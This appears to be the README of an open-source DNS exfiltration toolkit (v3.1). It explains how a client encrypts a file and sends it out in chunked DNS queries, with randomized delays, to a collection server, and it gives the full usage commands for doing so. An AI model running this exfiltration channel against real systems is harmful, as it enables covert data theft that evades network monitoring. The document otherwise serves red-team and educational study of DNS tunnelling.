# DNS Exfiltration Client & Server (v3.1)

This toolkit demonstrates secure DNS-based file exfiltration using modern cryptography:

- **True Perfect Forward Secrecy** — both sides generate ephemeral X25519 keypairs per session; no key material is ever persisted to disk
- **Optional Mutual Authentication** — Ed25519 identity keys allow both sides to verify each other during key exchange (MITM protection)
- **Authenticated encryption** using AES-GCM for confidentiality + HMAC-SHA256 for integrity
- **Base32** payload encoding for DNS-safe transfers
- **Chunked UDP DNS queries** for transport
- **Stateless session reassembly** on the server keyed by client UUID

---

## What's New in v3.1

v3.0 introduced per-session ephemeral ECDH for true perfect forward secrecy, but neither side authenticated the other during key exchange — leaving the protocol vulnerable to man-in-the-middle attacks.

v3.1 adds **optional mutual authentication** via Ed25519 identity keys:

- **`keygen.py`** — new utility to generate Ed25519 identity keypairs
- **Client** — new `--signing-key` and `--server-identity-pubkey` flags to sign its ephemeral key and verify the server's
- **Server** — new `--signing-key` and `--trusted-clients-dir` flags to sign its ephemeral key and verify trusted clients
- **EXFIL log line** now includes `auth=TRUSTED` or `auth=UNAUTHENTICATED` for auditing
- **Fully backward compatible** — omitting the new flags produces identical behavior to v3.0

---

## Components

### keygen.py

- Generates an Ed25519 identity keypair for mutual authentication
- Writes raw 32-byte files: `<name>_ed25519` (private seed, chmod 600) and `<name>_ed25519.pub` (public key)
- Prints the SHA-256 fingerprint (first 8 bytes, hex-encoded) used to identify the key during key exchange

### client.py

- Generates an ephemeral X25519 keypair per transfer
- Sends client public key as a **TXT query** (`<id>-0-0-<b32_payload>.<domain>`)
- If `--signing-key` is provided: signs the ephemeral pubkey with Ed25519 and appends the 64-byte signature + 8-byte fingerprint to the payload (104 B total)
- Receives the server's ephemeral public key in the **TXT response**
- If `--server-identity-pubkey` is provided: verifies the server's Ed25519 signature on its ephemeral key (96 B response)
- Logs `TRUSTED` or `UNAUTHENTICATED` based on authentication outcome
- Derives a per-transfer AES (32 B) + HMAC (16 B) key via HKDF
- Encrypts file with AES-GCM (12 B nonce), appends HMAC-SHA256 tag
- Base32-encodes the blob, splits into randomized-size subdomains (≤ 52 chars of data)
- Sends data chunks as DNS A queries with configurable inter-query delays (`--low`/`--high`)
- Retries failed queries up to `MAX_RETRIES`

### server.py

- Listens on a configurable UDP port for DNS queries
- On TXT queries matching `<id>-0-0-<payload>.<domain>`:
  - Decodes payload: 32 bytes = unauthenticated, 104 bytes = authenticated (pubkey + Ed25519 sig + 8-byte fingerprint)
  - If 104 B: looks up client fingerprint in `--trusted-clients-dir`, verifies Ed25519 signature → logs `TRUSTED` or warns
  - If 32 B: proceeds as unauthenticated (unchanged from v3.0)
  - Generates an ephemeral X25519 keypair for this session
  - Derives shared AES + HMAC keys via ECDH + HKDF
  - If server has `--signing-key` AND client sent 104 B: signs its ephemeral pubkey and responds with 96 B. Otherwise responds with 32 B.
  - Idempotent: retried key exchanges return the cached response
- On A queries matching `<id>-<idx>-<total>-<chunk>.<domain>`:
  - Buffers Base32 fragments, decodes, verifies HMAC, decrypts AES-GCM
  - Writes plaintext to `output/<id>.bin`
  - EXFIL log line includes `auth=TRUSTED` or `auth=UNAUTHENTICATED`
- Cleans up idle sessions (including auth status) periodically

---

## Installation

```bash
git clone https://github.com/bufo333/python-dns-exfiltration-client-server.git
cd python-dns-exfiltration-client-server
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

No additional dependencies are needed — `cryptography>=46.0.5` already includes Ed25519 support.

---

## Quick Start

### 1. Unauthenticated Mode (default, backward compatible with v3.0)

No key generation needed. Both sides behave identically to v3.0:

**Start the server:**

```bash
python server.py \
  --port 5300 \
  --domain xf.example.com \
  --output-dir output
```

**Run the client:**

```bash
python client.py \
  --server-ip   127.0.0.1 \
  --server-port 5300 \
  --domain      xf.example.com \
  --file-path   secret.txt
```

**Expected log output (client):**

```
INFO - [a1b2c3d4] Key exchange completed — UNAUTHENTICATED
INFO - Received server ephemeral pubkey for session a1b2c3d4
INFO - Keys established for session a1b2c3d4
INFO - All chunks sent successfully
```

**Expected log output (server):**

```
INFO - [a1b2c3d4] Unauthenticated key exchange (no client signature)
INFO - [a1b2c3d4] Ephemeral session keys established (auth=UNAUTHENTICATED)
INFO - EXFIL session_id=a1b2c3d4 chunks=7 plaintext_bytes=33 auth=UNAUTHENTICATED output=output/a1b2c3d4.bin
```

### 2. Authenticated Mode (mutual Ed25519 verification)

#### Step 1: Generate identity keypairs

```bash
python keygen.py --name server  --output-dir keys/
python keygen.py --name client1 --output-dir keys/
```

Output:

```
Keypair generated:
  Private key: keys/server_ed25519
  Public key:  keys/server_ed25519.pub
  Fingerprint: 246994f75f2820b6

Keypair generated:
  Private key: keys/client1_ed25519
  Public key:  keys/client1_ed25519.pub
  Fingerprint: 4bedb931372565f6
```

#### Step 2: Distribute public keys out-of-band

```bash
# Copy the client's public key to a directory the server can read
mkdir -p trusted_clients/
cp keys/client1_ed25519.pub trusted_clients/

# Copy the server's public key to the client machine
# (in this example, both are on the same host)
```

Identity public keys are **never sent over the wire** — they must be pre-shared via a trusted channel (USB, SCP, etc.).

#### Step 3: Start the server with authentication

```bash
python server.py \
  --port 5300 \
  --domain xf.example.com \
  --output-dir output \
  --signing-key keys/server_ed25519 \
  --trusted-clients-dir trusted_clients/
```

**Expected startup log:**

```
INFO - Loaded server signing key from keys/server_ed25519
INFO - Loaded trusted client key: client1_ed25519.pub (fingerprint=4bedb931372565f6)
INFO - Loaded 1 trusted client key(s)
INFO - Listening on UDP/5300...
```

#### Step 4: Run the client with authentication

```bash
python client.py \
  --server-ip   127.0.0.1 \
  --server-port 5300 \
  --domain      xf.example.com \
  --file-path   secret.txt \
  --signing-key keys/client1_ed25519 \
  --server-identity-pubkey keys/server_ed25519.pub
```

**Expected log output (client):**

```
INFO - [e1657737] Signing ephemeral key for authentication
INFO - [e1657737] Server identity VERIFIED — TRUSTED
INFO - Received server ephemeral pubkey for session e1657737
INFO - Keys established for session e1657737
INFO - All chunks sent successfully
```

**Expected log output (server):**

```
INFO - [e1657737] Client identity VERIFIED — TRUSTED (fingerprint=4bedb931372565f6)
INFO - [e1657737] Ephemeral session keys established (auth=TRUSTED)
INFO - EXFIL session_id=e1657737 chunks=7 plaintext_bytes=31 auth=TRUSTED output=output/e1657737.bin
```

### 3. Mixed Mode (auth server + unauthenticated client)

The server accepts both authenticated and unauthenticated clients simultaneously. An unauthenticated client connecting to an auth-enabled server works without any changes:

**Server** (running with auth as in example 2 above):

```bash
python server.py \
  --port 5300 \
  --domain xf.example.com \
  --output-dir output \
  --signing-key keys/server_ed25519 \
  --trusted-clients-dir trusted_clients/
```

**Client** (no auth flags):

```bash
python client.py \
  --server-ip   127.0.0.1 \
  --server-port 5300 \
  --domain      xf.example.com \
  --file-path   secret.txt
```

**Expected log output (server):**

```
INFO - [c920aad7] Unauthenticated key exchange (no client signature)
INFO - [c920aad7] Ephemeral session keys established (auth=UNAUTHENTICATED)
INFO - EXFIL session_id=c920aad7 chunks=5 plaintext_bytes=16 auth=UNAUTHENTICATED output=output/c920aad7.bin
```

The server responds with an unsigned 32 B ephemeral pubkey (not 96 B) since the client did not request authentication. This ensures old clients continue to work unmodified.

---

## Protocol

### Unauthenticated Flow (v3.0 compatible)

1. Client generates session ID + ephemeral X25519 keypair
2. Client sends **TXT query**: `<id>-0-0-<b32_pubkey>.<domain>` (32 B pubkey → 52 base32 chars)
3. Server generates ephemeral keypair, derives shared keys via ECDH + HKDF
4. Server responds with **TXT record**: Base32-encoded ephemeral pubkey (32 B, TTL=0)
5. Client derives the same shared keys
6. Client encrypts file (AES-GCM), appends HMAC-SHA256 tag, Base32-encodes
7. Client sends data chunks as **A queries**: `<id>-<idx>-<total>-<chunk>.<domain>`
8. Server reassembles, verifies HMAC, decrypts, writes output

### Authenticated Flow (v3.1)

1. Client generates session ID + ephemeral X25519 keypair
2. Client **signs** its ephemeral pubkey with its Ed25519 identity key
3. Client sends **TXT query** with extended payload: `pubkey(32B) || ed25519_sig(64B) || fingerprint(8B)` = 104 B → ~167 base32 chars split across 3 DNS labels
4. Server decodes 104 B, looks up the 8-byte fingerprint in its trusted clients directory, verifies the Ed25519 signature
5. Server generates ephemeral keypair, derives shared keys via ECDH + HKDF
6. Server **signs** its ephemeral pubkey with its Ed25519 identity key
7. Server responds with **TXT record**: `pubkey(32B) || ed25519_sig(64B)` = 96 B → ~154 base32 chars
8. Client verifies the server's Ed25519 signature using the pre-shared server public key
9. Client derives the same shared keys
10. Data transfer proceeds identically (AES-GCM + HMAC + Base32 chunks)

### Wire Format Summary

| Direction | Unauthenticated | Authenticated |
|-----------|----------------|---------------|
| Client → Server (TXT query payload) | 32 B (pubkey) | 104 B (pubkey + sig + fingerprint) |
| Server → Client (TXT response rdata) | 32 B (pubkey) | 96 B (pubkey + sig) |
| Data chunks (A queries) | Unchanged | Unchanged |

The server distinguishes modes by decoded payload length. The client distinguishes by decoded response length.

---

## Backward Compatibility

| Scenario | Behavior |
|----------|----------|
| Old client + new server (no auth flags) | Server has no signing key or trusted dir — identical to v3.0. |
| Old client + new server (with auth flags) | Client sends 32 B → server takes unauthenticated path, responds with unsigned 32 B. Fully compatible. |
| New client (no auth flags) + new server | Same as above — no flags means no auth payload. |
| New client (with auth) + new server (with auth) | Full mutual authentication. Both sides log `TRUSTED`. |
| New client (with auth) + old server (v3.0) | Old server will fail to parse the 104 B payload. **Update the server first.** |

---

## CLI Reference

### keygen.py

```text
usage: keygen.py [-h] --name NAME [--output-dir DIR]

Generate Ed25519 keypair for DNS exfiltration authentication

options:
  --name NAME           Key name prefix (e.g. "server", "client1")
  --output-dir DIR      Directory to write key files (default: .)
```

### server.py

```text
usage: server.py [-h] [--port PORT] [--output-dir DIR] [--domain DOMAIN]
                 [--rate-limit-window SECONDS] [--rate-limit-max COUNT]
                 [--signing-key PATH] [--trusted-clients-dir DIR]

DNS Exfiltration Server (Ephemeral ECDH + AES-GCM + HMAC)

options:
  --port PORT                   UDP listen port (default: 5300)
  --output-dir DIR              Directory for decrypted output files (default: output)
  --domain DOMAIN               Base domain for DNS queries (default: xf.example.com)
  --rate-limit-window SECONDS   Rate limit window in seconds (default: 60)
  --rate-limit-max COUNT        Max requests per IP per window (default: 200)
  --signing-key PATH            Path to server Ed25519 private key for signing
                                ephemeral keys (enables server-side authentication)
  --trusted-clients-dir DIR     Directory containing trusted client .pub files
                                (enables client identity verification)
```

### client.py

```text
usage: client.py [-h] [--server-ip IP] [--server-port PORT] [--domain DOMAIN]
                 [--low MS] [--high MS] --file-path FILE_PATH
                 [--signing-key PATH] [--server-identity-pubkey PATH]

DNS Exfiltration Client (Ephemeral ECDH + AES-GCM + HMAC)

options:
  --server-ip IP                    Server IP address (default: 127.0.0.1)
  --server-port PORT                Server UDP port (default: 5300)
  --domain DOMAIN                   Base domain (default: xf.example.com)
  --low MS                          Min inter-query delay in ms (default: 500)
  --high MS                         Max inter-query delay in ms (default: 1000)
  --file-path FILE_PATH             Path to file to exfiltrate (required)
  --signing-key PATH                Path to client Ed25519 private key for signing
                                    ephemeral keys (enables client-side authentication)
  --server-identity-pubkey PATH     Path to server Ed25519 public key for verifying
                                    server identity (enables server verification)
```

---

## Adding Trusted Clients

To authorize a new client for authenticated sessions:

1. Generate a keypair on the client machine:
   ```bash
   python keygen.py --name client2 --output-dir keys/
   ```

2. Copy the `.pub` file to the server's trusted clients directory:
   ```bash
   scp keys/client2_ed25519.pub server-host:trusted_clients/
   ```

3. Restart the server (or it will pick up new keys on next startup). The server logs each loaded key with its fingerprint:
   ```
   INFO - Loaded trusted client key: client2_ed25519.pub (fingerprint=abcdef0123456789)
   ```

4. Give the client the server's public key:
   ```bash
   scp server-host:keys/server_ed25519.pub keys/
   ```

To revoke a client, remove its `.pub` file from the trusted directory and restart the server.

---

## Output

Decrypted files land in `--output-dir` (default `output/`). File names match the session ID (`<id>.bin`).

---

## Security Notes

- **Perfect forward secrecy**: Ephemeral X25519 keypairs on both sides per session. No session key material ever touches disk — compromise of the server host reveals nothing about past sessions.
- **MITM protection**: When Ed25519 identity keys are configured, both sides verify the other's ephemeral key signature during key exchange. An attacker cannot inject their own ephemeral key without being detected.
- **Graceful degradation**: Without identity keys, the protocol falls back to unauthenticated ECDH (same as v3.0). This is still encrypted and integrity-protected, just not authenticated.
- **Identity key separation**: Ed25519 identity keys are long-lived but only used for signing — they cannot decrypt past or future traffic. Compromise of an identity key does not break PFS.
- **Fingerprint-based lookup**: The client sends an 8-byte SHA-256 fingerprint of its public key so the server can look up the right trusted key without the client revealing its full identity public key over the wire.
- **Authenticated encryption**: AES-GCM provides confidentiality + integrity; the additional HMAC-SHA256 layer provides a second integrity check.
- **Rate limiting**: Per-IP rate limiting on the server (configurable via `--rate-limit-window` and `--rate-limit-max`).
- **Session cleanup**: Idle sessions are automatically cleaned up (default: 10 minutes TTL).

---

## License & Author

**Author:** John Burns
**Date:** 2025-05-07
**License:** GPL-3.0
